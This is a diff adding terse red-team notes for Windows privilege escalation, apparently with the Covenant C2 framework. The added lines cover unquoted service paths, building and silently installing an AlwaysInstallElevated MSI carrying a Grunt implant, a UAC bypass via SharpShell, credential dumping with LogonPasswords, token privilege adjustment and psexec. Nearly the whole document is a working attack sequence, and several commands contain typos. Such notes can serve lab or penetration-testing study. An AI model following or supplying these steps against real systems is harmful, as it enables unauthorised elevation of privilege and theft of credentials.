@@ -36,6 +36,43 @@ connect localhost namesmbgrunt
 #Unquoted Service Paths
 An unquoted service path is where the path to the service binary is not wrapped in quotes.
 wmic service get name, pathname
+shell wmic service get name. pathname
+PowerShell Get-Acl -Path C:\ | Format-List
+PowerShell Get-Acl -Path "C:\Program Files\program" | f1
+upload a file to path
+powershell stop-service
+powershell start-service
+connect localhost namesmbgrunt
+
+#Always Install Elevated
+SharUp
+=== AlwaysInstallElevated Registry Keys === 
+  HKLM: 1 
+  HKCU: 1
+GruntSmb
+VisualStudio + Setup Project + Target Platform x86 + Add File + Grunt + View Custom Actions + InstallerClass False Run64b True + Net Framewrok 4.0 + save + build
+pwd
+upload gruntinstaller.msi
+shell msiexec /i: G:\Destkop\gruntinstaller.msi /qn
+connect localhost namesmbgruntsvc
+
+#UAC Bypass
+BypassUACGrunt powershell
+whoami /groups
+BUILTIN\Administrators
+Mandatory Label\Medium Mandatory Level
+SharpShell /code:"var startInfo = new System.Diagnostics.ProcessStartInfo { FileName = @\"C:\Windows\System32\Taskmgr.exe\", WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden }; var taskmgr = new System.Diagnostics.Process { StartInfo = startInfo }; taskmgr.Start(); return taskmgr.Id.ToString();"
+ps
+LogonPasswords
+Setabelt TokenPrivileges
+AdjustTokenPrivileges
+psexec localhost servicebinary
+
+
+
+
+
+
 
 
 
